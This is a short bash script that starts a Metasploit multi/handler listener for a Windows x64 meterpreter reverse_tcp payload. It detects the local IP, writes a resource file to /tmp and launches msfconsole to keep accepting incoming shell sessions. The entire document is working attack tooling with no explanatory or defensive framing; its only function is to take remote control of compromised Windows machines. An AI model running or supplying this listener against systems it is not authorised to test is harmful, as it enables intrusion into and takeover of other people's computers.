#!/bin/bash

# Quick Reverse TCP Handler
PAYLOAD="windows/x64/meterpreter/reverse_tcp"
LHOST=$(ip route get 1 | awk '{print $7}' | head -1)
LPORT=4444

echo "Starting multi/handler on $LHOST:$LPORT for $PAYLOAD"

cat << EOF > /tmp/handler.rc
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF

msfconsole -q -r /tmp/handler.rc
